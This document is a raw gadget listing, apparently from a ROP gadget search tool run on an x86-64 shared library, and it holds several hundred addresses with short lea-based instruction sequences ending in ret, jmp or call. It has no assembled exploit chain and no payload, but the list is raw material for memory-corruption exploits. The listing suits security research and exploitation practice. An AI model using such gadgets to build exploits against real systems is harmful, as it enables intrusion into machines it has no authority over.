0x00002aaaaab7acd8 : lea edi, dword ptr [rdi + 0x19] ; jne 0xa6289 ; ret
0x00002aaaaab7c42c : lea edi, dword ptr [rdi + 0x19] ; jne 0xa7a99 ; ret
0x00002aaaaab7ad0d : lea edi, dword ptr [rdi + 0x1a] ; jne 0xa6289 ; ret
0x00002aaaaab7c461 : lea edi, dword ptr [rdi + 0x1a] ; jne 0xa7a99 ; ret
0x00002aaaaab7ad3b : lea edi, dword ptr [rdi + 0x1b] ; jne 0xa6289 ; ret
0x00002aaaaab7c48f : lea edi, dword ptr [rdi + 0x1b] ; jne 0xa7a99 ; ret
0x00002aaaaab7ad6b : lea edi, dword ptr [rdi + 0x1c] ; jne 0xa6289 ; ret
0x00002aaaaab7c4bf : lea edi, dword ptr [rdi + 0x1c] ; jne 0xa7a99 ; ret
0x00002aaaaab7ad97 : lea edi, dword ptr [rdi + 0x1d] ; jne 0xa6289 ; ret
0x00002aaaaab7c4eb : lea edi, dword ptr [rdi + 0x1d] ; jne 0xa7a99 ; ret
0x00002aaaaab7adc7 : lea edi, dword ptr [rdi + 0x1e] ; jne 0xa6289 ; ret
0x00002aaaaab7c51b : lea edi, dword ptr [rdi + 0x1e] ; jne 0xa7a99 ; ret
0x00002aaaaab7adf7 : lea edi, dword ptr [rdi + 0x1f] ; jne 0xa6289 ; ret
0x00002aaaaab7c54b : lea edi, dword ptr [rdi + 0x1f] ; jne 0xa7a99 ; ret
0x00002aaaaab7ae27 : lea edi, dword ptr [rdi + 0x20] ; jne 0xa6289 ; ret
0x00002aaaaab7c57b : lea edi, dword ptr [rdi + 0x20] ; jne 0xa7a99 ; ret
0x00002aaaaab7aaf3 : lea edi, dword ptr [rdi + 0xa] ; jne 0xa6289 ; ret
0x00002aaaaab7c197 : lea edi, dword ptr [rdi + 0xa] ; jne 0xa7a99 ; ret
0x00002aaaaab7ab11 : lea edi, dword ptr [rdi + 0xb] ; jne 0xa6289 ; ret
0x00002aaaaab7c1c5 : lea edi, dword ptr [rdi + 0xb] ; jne 0xa7a99 ; ret
0x00002aaaaab7ab31 : lea edi, dword ptr [rdi + 0xc] ; jne 0xa6289 ; ret
0x00002aaaaab7c1e5 : lea edi, dword ptr [rdi + 0xc] ; jne 0xa7a99 ; ret
0x00002aaaaab7ab53 : lea edi, dword ptr [rdi + 0xd] ; jne 0xa6289 ; ret
0x00002aaaaab7c207 : lea edi, dword ptr [rdi + 0xd] ; jne 0xa7a99 ; ret
0x00002aaaaab7ab73 : lea edi, dword ptr [rdi + 0xe] ; jne 0xa6289 ; ret
0x00002aaaaab7c237 : lea edi, dword ptr [rdi + 0xe] ; jne 0xa7a99 ; ret
0x00002aaaaab7ab93 : lea edi, dword ptr [rdi + 0xf] ; jne 0xa6289 ; ret
0x00002aaaaab7c267 : lea edi, dword ptr [rdi + 0xf] ; jne 0xa7a99 ; ret
0x00002aaaaab7a9c7 : lea edi, dword ptr [rdi + 1] ; jne 0xa6289 ; ret
0x00002aaaaab7c06a : lea edi, dword ptr [rdi + 1] ; jne 0xa7a99 ; ret
0x00002aaaaab7a9eb : lea edi, dword ptr [rdi + 2] ; jne 0xa6289 ; ret
0x00002aaaaab7c08f : lea edi, dword ptr [rdi + 2] ; jne 0xa7a99 ; ret
0x00002aaaaab7aa0e : lea edi, dword ptr [rdi + 3] ; jne 0xa6289 ; ret
0x00002aaaaab7c0b2 : lea edi, dword ptr [rdi + 3] ; jne 0xa7a99 ; ret
0x00002aaaaab7aa29 : lea edi, dword ptr [rdi + 4] ; jne 0xa6289 ; ret
0x00002aaaaab7c0cd : lea edi, dword ptr [rdi + 4] ; jne 0xa7a99 ; ret
0x00002aaaaab7aa4c : lea edi, dword ptr [rdi + 5] ; jne 0xa6289 ; ret
0x00002aaaaab7c0f0 : lea edi, dword ptr [rdi + 5] ; jne 0xa7a99 ; ret
0x00002aaaaab7aa71 : lea edi, dword ptr [rdi + 6] ; jne 0xa6289 ; ret
0x00002aaaaab7c115 : lea edi, dword ptr [rdi + 6] ; jne 0xa7a99 ; ret
0x00002aaaaab7aa8f : lea edi, dword ptr [rdi + 7] ; jne 0xa6289 ; ret
0x00002aaaaab7c133 : lea edi, dword ptr [rdi + 7] ; jne 0xa7a99 ; ret
0x00002aaaaab7aaab : lea edi, dword ptr [rdi + 8] ; jne 0xa6289 ; ret
0x00002aaaaab7c14f : lea edi, dword ptr [rdi + 8] ; jne 0xa7a99 ; ret
0x00002aaaaab7aace : lea edi, dword ptr [rdi + 9] ; jne 0xa6289 ; ret
0x00002aaaaab7c172 : lea edi, dword ptr [rdi + 9] ; jne 0xa7a99 ; ret
0x00002aaaaaaf8652 : lea edi, dword ptr [rdx + 0x10] ; mov qword ptr [rbp - 0x58], rdx ; call 0x1f8a9
0x00002aaaaab20511 : lea edi, dword ptr [rip + 0x1445f1] ; call 0x777f8
0x00002aaaaabf4b21 : lea edi, dword ptr [rip + 0x2a7bd5] ; call rax
0x00002aaaaabf42c2 : lea edi, dword ptr [rip + 0x2a83d8] ; call rax
0x00002aaaaab944fd : lea edi, dword ptr [rip + 0xc8571] ; add rax, rdi ; jmp rax
0x00002aaaaab92499 : lea edi, dword ptr [rip + 0xd00ef] ; call 0x39778
0x00002aaaaabe9f57 : lea edi, dword ptr [rip - 0x16d] ; call rax
0x00002aaaaabcaef5 : lea edi, dword ptr [rsp + 0xc] ; call rax
0x00002aaaaab5184b : lea edx, dword ptr [rax + 0x60] ; mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x00002aaaaab50426 : lea edx, dword ptr [rax + 1] ; mov qword ptr [rbx + 8], rdx ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaab4cf5b : lea edx, dword ptr [rax + 1] ; mov qword ptr [rdi + 8], rdx ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaab0b8a9 : lea edx, dword ptr [rax - 1] ; mov dword ptr [rip + 0x38c7d6], edx ; ret
0x00002aaaaac25504 : lea edx, dword ptr [rbx + rdx] ; jmp rdx
0x00002aaaaab73238 : lea edx, dword ptr [rcx + 1] ; mov byte ptr [rcx], 0 ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab732b7 : lea edx, dword ptr [rcx + 1] ; mov byte ptr [rcx], 0 ; pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab47eed : lea edx, dword ptr [rdx + rcx*4] ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x00002aaaaab5e1e6 : lea edx, dword ptr [rdx + rcx] ; jmp r10
0x00002aaaaabdef93 : lea edx, dword ptr [rdx + rsi*4] ; add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaac258f8 : lea edx, dword ptr [rdx - 0x40] ; jmp r9
0x00002aaaaac0c628 : lea edx, dword ptr [rip + 0x290972] ; mov qword ptr fs:[rax], rdx ; ret
0x00002aaaaac021c1 : lea edx, dword ptr [rip + 0x2959b9] ; mov rax, qword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaac0b791 : lea edx, dword ptr [rip + 0x3609] ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaabea6fb : lea edx, dword ptr [rip + 0x4003f] ; cmove rax, rdx ; ret
0x00002aaaaab635e6 : lea edx, dword ptr [rip + 0xc7164] ; cmove rax, rdx ; ret
0x00002aaaaac00f8d : lea edx, dword ptr [rip + 0xde0d] ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab470a1 : lea edx, dword ptr [rsi + 4] ; mov qword ptr [rax], rdx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaabc858b : lea esi, dword ptr [rax + 1] ; mov qword ptr [rdi], rax ; mov rdi, rbx ; call 0x1f7fb
0x00002aaaaab37053 : lea esi, dword ptr [rax - 0x77000005] ; adc byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab49fe0 : lea esi, dword ptr [rbp + 0x50] ; lea r9, qword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x00002aaaaabe9f53 : lea esi, dword ptr [rbp - 0x20] ; lea rdi, qword ptr [rip - 0x16d] ; call rax
0x00002aaaaaba2f0e : lea esi, dword ptr [rbp - 0xc0] ; mov rdi, rbx ; call qword ptr [r15]
0x00002aaaaabb28c1 : lea esi, dword ptr [rbx + rbp] ; call 0x938c9
0x00002aaaaab46270 : lea esi, dword ptr [rcx + 4] ; mov qword ptr [rdx + 0x20], rsi ; mov dword ptr [rcx], eax ; ret
0x00002aaaaabffba0 : lea esi, dword ptr [rdi + 0x48] ; mov rdi, rax ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaaad7eea : lea esi, dword ptr [rdi] ; ret 0x793b
0x00002aaaaab23617 : lea esi, dword ptr [rip + 0x1304] ; add rax, rsi ; jmp rax
0x00002aaaaab1a0df : lea esi, dword ptr [rip + 0x1cb] ; call rax
0x00002aaaaab4421a : lea esi, dword ptr [rip + 0x30] ; call rax
0x00002aaaaab50f0a : lea esi, dword ptr [rip - 0x15e0] ; call rax
0x00002aaaaab512fa : lea esi, dword ptr [rip - 0x19d0] ; call rax
0x00002aaaaab5174a : lea esi, dword ptr [rip - 0x1e20] ; call rax
0x00002aaaaab44513 : lea esi, dword ptr [rip - 0x2c9] ; call rax
0x00002aaaaab4fc3a : lea esi, dword ptr [rip - 0x310] ; call rax
0x00002aaaaab4feaa : lea esi, dword ptr [rip - 0x580] ; call rax
0x00002aaaaab68932 : lea esi, dword ptr [rsi + 0x10] ; lea rdi, qword ptr [rdi + 0x10] ; jne 0x9392a ; ret
0x00002aaaaac0f64d : lea esi, dword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac02ab5 : lea esi, dword ptr [rsp + 8] ; call qword ptr [rax]
0x00002aaaaab42e23 : lea esi, dword ptr [rsp + 8] ; mov rdi, qword ptr [rdi + 0xe0] ; call rax
0x00002aaaaac0f9fa : lea esi, dword ptr [rsp + 8] ; mov rdi, r12 ; call qword ptr [rax]
0x00002aaaaac0efbd : lea esi, dword ptr [rsp + 8] ; mov rdi, rbx ; call qword ptr [rax]
0x00002aaaaab0e8c2 : lea esp, dword ptr [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret
0x00002aaaaab42121 : lea esp, dword ptr [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaaba1854 : lea esp, dword ptr [rbp - 0x18] ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaaba1afe : lea esp, dword ptr [rbp - 0x20] ; pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00002aaaaab0c303 : lea esp, dword ptr [rsi + rax] ; mov rbx, rax ; mov rdi, r12 ; call r15
0x00002aaaaab5e1e5 : lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaab0c302 : lea r12, qword ptr [rsi + rax] ; mov rbx, rax ; mov rdi, r12 ; call r15
0x00002aaaaabb28c0 : lea r14d, dword ptr [rbx + r13] ; call 0x938ca
0x00002aaaaab0dfeb : lea r15, qword ptr [rbx + r14] ; call rax
0x00002aaaaac0b20c : lea r8, qword ptr [rip - 0x6803] ; mov rdi, rax ; call qword ptr [r10]
0x00002aaaaac2542f : lea r9, qword ptr [r11 + r9] ; jmp r9
0x00002aaaaab1d38f : lea r9, qword ptr [rdx] ; jmp 0x483e7
0x00002aaaaab1ef6f : lea r9, qword ptr [rdx] ; jmp 0x49fc7
0x00002aaaaac0b308 : lea r9, qword ptr [rsp + 0x10] ; call qword ptr [r10]
0x00002aaaaab49fe3 : lea r9, qword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x00002aaaaac00ed7 : lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab4a0bf : lea r9, qword ptr [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x00002aaaaac0b119 : lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [r10]
0x00002aaaaac00de5 : lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaab814c8 : lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab81128 : lea r9, qword ptr [rsp + 0x20] ; lea rcx, qword ptr [rax + 4] ; call rbx
0x00002aaaaab80ffd : lea r9, qword ptr [rsp + 0x28] ; lea rcx, qword ptr [rax + 1] ; call rbx
0x00002aaaaac0c4b1 : lea r9, qword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaac00c0b : lea r9, qword ptr [rsp + 0x2c] ; call qword ptr [rax]
0x00002aaaaac0137a : lea r9, qword ptr [rsp + 0x30] ; call qword ptr [rax]
0x00002aaaaab8f46b : lea r9, qword ptr [rsp + 0x30] ; mov rdi, qword ptr [rax] ; call r14
0x00002aaaaab819a9 : lea r9, qword ptr [rsp + 0x30] ; mov rdi, rbp ; call rbx
0x00002aaaaac0c272 : lea r9, qword ptr [rsp + 0x3a] ; call qword ptr [rax]
0x00002aaaaab81c6a : lea r9, qword ptr [rsp + 0x70] ; mov rdi, r12 ; call rbx
0x00002aaaaab816e0 : lea r9, qword ptr [rsp + 0x70] ; mov rdi, rbp ; call rbx
0x00002aaaaaba2009 : lea rax, qword ptr [rax + rax - 1] ; ret
0x00002aaaaab62f93 : lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x00002aaaaab62fa3 : lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x00002aaaaab73553 : lea rax, qword ptr [rax + rdi + 0x30] ; ret
0x00002aaaaab62f73 : lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x00002aaaaab9bdd1 : lea rax, qword ptr [rax + rdx*8] ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0269a : lea rax, qword ptr [rbx + 0x2260] ; pop rbx ; ret
0x00002aaaaab80e37 : lea rax, qword ptr [rbx - 4] ; pop rbx ; ret
0x00002aaaaab61a3c : lea rax, qword ptr [rcx + rsi] ; ret
0x00002aaaaab7e7d3 : lea rax, qword ptr [rcx - 1] ; ret
0x00002aaaaab7b8fb : lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b910 : lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7b92e : lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7b94e : lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7b971 : lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7b990 : lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7b9b0 : lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7b9d0 : lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7b9f3 : lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7ba18 : lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7ba36 : lea rax, qword ptr [rdi + 0x1a] ; ret
0x00002aaaaab7ba56 : lea rax, qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab7ba72 : lea rax, qword ptr [rdi + 0x1c] ; ret
0x00002aaaaab7ba92 : lea rax, qword ptr [rdi + 0x1d] ; ret
0x00002aaaaab7bab2 : lea rax, qword ptr [rdi + 0x1e] ; ret
0x00002aaaaab7bad2 : lea rax, qword ptr [rdi + 0x1f] ; ret
0x00002aaaaab7c922 : lea rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaab7cb88 : lea rax, qword ptr [rdi + 0x40] ; ret
0x00002aaaaab7b84c : lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaab7b86c : lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaab7b88e : lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaab7b8ae : lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaab7b8ce : lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaab7b8e8 : lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab72eb3 : lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab72ec7 : lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab72ed2 : lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab72ee6 : lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab72ef6 : lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaab72f06 : lea rax, qword ptr [rdi + 6] ; mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab7b7fa : lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab72ea6 : lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7b819 : lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7b82e : lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab62fc8 : lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab62fd8 : lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab62ec2 : lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaabf78e0 : lea rax, qword ptr [rdi + rax + 2] ; cmp rdx, rax ; sbb eax, eax ; ret
0x00002aaaaab5df4b : lea rax, qword ptr [rdi + rax] ; cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x00002aaaaab6abf6 : lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaac1ea79 : lea rax, qword ptr [rdi + rcx] ; sub rax, r8 ; ret
0x00002aaaaabf859f : lea rax, qword ptr [rdi + rsi + 8] ; ret
0x00002aaaaab02a64 : lea rax, qword ptr [rdi + rsi*4] ; mov eax, dword ptr [rax + rdx] ; ret
0x00002aaaaab61938 : lea rax, qword ptr [rdi + rsi] ; ret
0x00002aaaaab8088d : lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab809f0 : lea rax, qword ptr [rdi - 0xc] ; ret
0x00002aaaaab80a10 : lea rax, qword ptr [rdi - 4] ; ret
0x00002aaaaab80a00 : lea rax, qword ptr [rdi - 8] ; ret
0x00002aaaaab7b782 : lea rax, qword ptr [rdi] ; ret
0x00002aaaaac3f4dc : lea rax, qword ptr [rdx + 0xa] ; ret
0x00002aaaaac3f4fc : lea rax, qword ptr [rdx + 0xb] ; ret
0x00002aaaaac3f51e : lea rax, qword ptr [rdx + 0xc] ; ret
0x00002aaaaac3f53e : lea rax, qword ptr [rdx + 0xd] ; ret
0x00002aaaaac417a6 : lea rax, qword ptr [rdx + 0xe] ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac3f55e : lea rax, qword ptr [rdx + 0xe] ; ret
0x00002aaaaac3f3ee : lea rax, qword ptr [rdx + 0xf] ; ret
0x00002aaaaac3f416 : lea rax, qword ptr [rdx + 1] ; ret
0x00002aaaaac3f42c : lea rax, qword ptr [rdx + 2] ; ret
0x00002aaaaac3f444 : lea rax, qword ptr [rdx + 3] ; ret
0x00002aaaaac3f45a : lea rax, qword ptr [rdx + 4] ; ret
0x00002aaaaac3f46c : lea rax, qword ptr [rdx + 5] ; ret
0x00002aaaaac3f48a : lea rax, qword ptr [rdx + 6] ; ret
0x00002aaaaac41851 : lea rax, qword ptr [rdx + 7] ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac3f396 : lea rax, qword ptr [rdx + 7] ; ret
0x00002aaaaac3f49c : lea rax, qword ptr [rdx + 8] ; ret
0x00002aaaaac3f4bc : lea rax, qword ptr [rdx + 9] ; ret
0x00002aaaaab7f0bb : lea rax, qword ptr [rdx + rdx] ; pop rbx ; and eax, 0x7ff80000 ; ret
0x00002aaaaac3f404 : lea rax, qword ptr [rdx] ; ret
0x00002aaaaab5ffa9 : lea rax, qword ptr [rip + 0x10] ; ret
0x00002aaaaab6379f : lea rax, qword ptr [rip + 0x10e4a] ; ret
0x00002aaaaab01b38 : lea rax, qword ptr [rip + 0x15f406] ; ret
0x00002aaaaaaf5930 : lea rax, qword ptr [rip + 0x16b154] ; ret
0x00002aaaaaaf5940 : lea rax, qword ptr [rip + 0x16d066] ; ret
0x00002aaaaab5ff5d : lea rax, qword ptr [rip + 0x1713c] ; ret
0x00002aaaaab5dcfd : lea rax, qword ptr [rip + 0x1777c] ; ret
0x00002aaaaab63639 : lea rax, qword ptr [rip + 0x1b330] ; ret
0x00002aaaaab62a95 : lea rax, qword ptr [rip + 0x1ba24] ; cmove rax, rdx ; ret
0x00002aaaaab63013 : lea rax, qword ptr [rip + 0x26] ; ret
0x00002aaaaabffdc8 : lea rax, qword ptr [rip + 0x29cf71] ; pop rbx ; ret
0x00002aaaaabffd90 : lea rax, qword ptr [rip + 0x29cfa9] ; pop rbx ; ret
0x00002aaaaabffcd1 : lea rax, qword ptr [rip + 0x29d068] ; pop rbx ; ret
0x00002aaaaabd63ce : lea rax, qword ptr [rip + 0x2c4e4b] ; add rsp, 0x18 ; ret
0x00002aaaaabd637a : lea rax, qword ptr [rip + 0x2c4edf] ; pop rbp ; pop r12 ; ret
0x00002aaaaabd5e36 : lea rax, qword ptr [rip + 0x2c5393] ; add rsp, 8 ; ret
0x00002aaaaabd5dd7 : lea rax, qword ptr [rip + 0x2c5412] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd39c7 : lea rax, qword ptr [rip + 0x2c7652] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd273d : lea rax, qword ptr [rip + 0x2c8854] ; ret
0x00002aaaaabd257d : lea rax, qword ptr [rip + 0x2c8a14] ; ret
0x00002aaaaabd23aa : lea rax, qword ptr [rip + 0x2c8be7] ; add rsp, 8 ; ret
0x00002aaaaab8fc2c : lea rax, qword ptr [rip + 0x30ad8d] ; add rsp, 8 ; ret
0x00002aaaaab3fc83 : lea rax, qword ptr [rip + 0x35aa76] ; pop rbx ; pop rbp ; ret
0x00002aaaaabea680 : lea rax, qword ptr [rip + 0x37c19] ; ret
0x00002aaaaabea770 : lea rax, qword ptr [rip + 0x37ec9] ; ret
0x00002aaaaab100e0 : lea rax, qword ptr [rip + 0x38d36f] ; add rsp, 8 ; ret
0x00002aaaaabff500 : lea rax, qword ptr [rip + 0x61a3e] ; ret
0x00002aaaaab63e39 : lea rax, qword ptr [rip + 0x80] ; ret
0x00002aaaaab6888e : lea rax, qword ptr [rip + 0xb3db] ; ret
0x00002aaaaab6885f : lea rax, qword ptr [rip + 0xb63a] ; ret
0x00002aaaaab688a2 : lea rax, qword ptr [rip + 0xbcb07] ; ret
0x00002aaaaab61eea : lea rax, qword ptr [rip + 0xbcd7f] ; ret
0x00002aaaaab61b5a : lea rax, qword ptr [rip + 0xbcfdf] ; ret
0x00002aaaaab637e0 : lea rax, qword ptr [rip + 0xbee69] ; ret
0x00002aaaaab5f6ea : lea rax, qword ptr [rip + 0xbf30f] ; ret
0x00002aaaaab800eb : lea rax, qword ptr [rip + 0xc20ce] ; ret
0x00002aaaaab80cc7 : lea rax, qword ptr [rip + 0xc31b2] ; ret
0x00002aaaaab80ccf : lea rax, qword ptr [rip + 0xc5a6a] ; ret
0x00002aaaaab5e14d : lea rax, qword ptr [rip + 0xc] ; ret
0x00002aaaaab6183d : lea rax, qword ptr [rip + 0xd999c] ; ret
0x00002aaaaab63e9c : lea rax, qword ptr [rip + 0xd] ; ret
0x00002aaaaab63ccd : lea rax, qword ptr [rip + 0xda08c] ; ret
0x00002aaaaab5f5dd : lea rax, qword ptr [rip + 0xda44c] ; ret
0x00002aaaaab63ded : lea rax, qword ptr [rip + 0xdb77c] ; ret
0x00002aaaaab63027 : lea rax, qword ptr [rip + 0xdf812] ; ret
0x00002aaaaab6302f : lea rax, qword ptr [rip + 0xe1f9a] ; ret
0x00002aaaaab5deea : lea rax, qword ptr [rip + 0xe6dbf] ; ret
0x00002aaaaab80cb3 : lea rax, qword ptr [rip + 0xe916] ; ret
0x00002aaaaab800e3 : lea rax, qword ptr [rip + 0xf596] ; ret
0x00002aaaaab2b9f5 : lea rax, qword ptr [rip - 0x2fa] ; add rax, rdx ; jmp rax
0x00002aaaaabcae85 : lea rax, qword ptr [rip - 0x4c] ; cmove rax, rdx ; ret
0x00002aaaaabea7b9 : lea rax, qword ptr [rip - 0x6be60] ; ret
0x00002aaaaabea72f : lea rax, qword ptr [rip - 0x76156] ; ret
0x00002aaaaabea63f : lea rax, qword ptr [rip - 0x767b6] ; ret
0x00002aaaaab809c9 : lea rax, qword ptr es:[rdi - 0x10] ; ret
0x00002aaaaab505d7 : lea rbp, qword ptr [rdi + 0x83] ; jmp 0x7b5c7
0x00002aaaaab6b289 : lea rbp, qword ptr [rdx - 1] ; ja 0x96273 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1c070 : lea rbx, qword ptr [rax + 1] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab1c060 : lea rbx, qword ptr [rip + 0x146ad7] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabda278 : lea rbx, qword ptr [rip + 0x888bf] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab7a03d : lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab81002 : lea rcx, qword ptr [rax + 1] ; call rbx
0x00002aaaaab8112d : lea rcx, qword ptr [rax + 4] ; call rbx
0x00002aaaaab8156d : lea rcx, qword ptr [rax + 4] ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaab92fb3 : lea rcx, qword ptr [rax + r12] ; mov rdx, rax ; jmp 0xbdfc6
0x00002aaaaac3cce5 : lea rcx, qword ptr [rdx + 0x10] ; jne 0x16823a ; ret
0x00002aaaaac3cfe3 : lea rcx, qword ptr [rdx + 0xa] ; jne 0x16823a ; ret
0x00002aaaaac3d003 : lea rcx, qword ptr [rdx + 0xb] ; jne 0x16823a ; ret
0x00002aaaaac3d023 : lea rcx, qword ptr [rdx + 0xc] ; jne 0x16823a ; ret
0x00002aaaaac3d045 : lea rcx, qword ptr [rdx + 0xd] ; jne 0x16823a ; ret
0x00002aaaaac3d065 : lea rcx, qword ptr [rdx + 0xe] ; jne 0x16823a ; ret
0x00002aaaaac3d085 : lea rcx, qword ptr [rdx + 0xf] ; jne 0x16823a ; ret
0x00002aaaaac3cedb : lea rcx, qword ptr [rdx + 1] ; jne 0x16823a ; ret
0x00002aaaaac3cefd : lea rcx, qword ptr [rdx + 2] ; jne 0x16823a ; ret
0x00002aaaaac3cf23 : lea rcx, qword ptr [rdx + 3] ; jne 0x16823a ; ret
0x00002aaaaac3cf3b : lea rcx, qword ptr [rdx + 4] ; jne 0x16823a ; ret
0x00002aaaaab47160 : lea rcx, qword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab455c5 : lea rcx, qword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaac3cf61 : lea rcx, qword ptr [rdx + 5] ; jne 0x16823a ; ret
0x00002aaaaac3cf83 : lea rcx, qword ptr [rdx + 6] ; jne 0x16823a ; ret
0x00002aaaaac3cfa1 : lea rcx, qword ptr [rdx + 7] ; jne 0x16823a ; ret
0x00002aaaaac3cc7d : lea rcx, qword ptr [rdx + 8] ; jne 0x16823a ; ret
0x00002aaaaac3cfc3 : lea rcx, qword ptr [rdx + 9] ; jne 0x16823a ; ret
0x00002aaaaab5cca0 : lea rcx, qword ptr [rip + 0x10429e] ; mov rdx, rcx ; jmp 0x87c79
0x00002aaaaab2e877 : lea rcx, qword ptr [rip - 0x7cc] ; add rax, rcx ; jmp rax
0x00002aaaaabdf1b6 : lea rcx, qword ptr [rsi + rcx*4] ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaac0723d : lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac09e41 : lea rdi, qword ptr [rbx + 0x58] ; call rax
0x00002aaaaac09421 : lea rdi, qword ptr [rbx + 0x68] ; call rax
0x00002aaaaac066a4 : lea rdi, qword ptr [rbx + 0xc8] ; call rax
0x00002aaaaab63875 : lea rdi, qword ptr [rdi + 0x10] ; jne 0x8e869 ; mov rax, rdi ; ret
0x00002aaaaab68935 : lea rdi, qword ptr [rdi + 0x10] ; jne 0x93927 ; ret
0x00002aaaaab7abac : lea rdi, qword ptr [rdi + 0x10] ; jne 0xa628a ; ret
0x00002aaaaab7c290 : lea rdi, qword ptr [rdi + 0x10] ; jne 0xa7a9a ; ret
0x00002aaaaab7abcf : lea rdi, qword ptr [rdi + 0x11] ; jne 0xa628a ; ret
0x00002aaaaab7c2b3 : lea rdi, qword ptr [rdi + 0x11] ; jne 0xa7a9a ; ret
0x00002aaaaab7abf4 : lea rdi, qword ptr [rdi + 0x12] ; jne 0xa628a ; ret
0x00002aaaaab7c2d8 : lea rdi, qword ptr [rdi + 0x12] ; jne 0xa7a9a ; ret
0x00002aaaaab7ac12 : lea rdi, qword ptr [rdi + 0x13] ; jne 0xa628a ; ret
0x00002aaaaab7c306 : lea rdi, qword ptr [rdi + 0x13] ; jne 0xa7a9a ; ret
0x00002aaaaab7ac32 : lea rdi, qword ptr [rdi + 0x14] ; jne 0xa628a ; ret
0x00002aaaaab7c336 : lea rdi, qword ptr [rdi + 0x14] ; jne 0xa7a9a ; ret
0x00002aaaaab7ac55 : lea rdi, qword ptr [rdi + 0x15] ; jne 0xa628a ; ret
0x00002aaaaab7c369 : lea rdi, qword ptr [rdi + 0x15] ; jne 0xa7a9a ; ret
0x00002aaaaab7ac74 : lea rdi, qword ptr [rdi + 0x16] ; jne 0xa628a ; ret
0x00002aaaaab7c398 : lea rdi, qword ptr [rdi + 0x16] ; jne 0xa7a9a ; ret
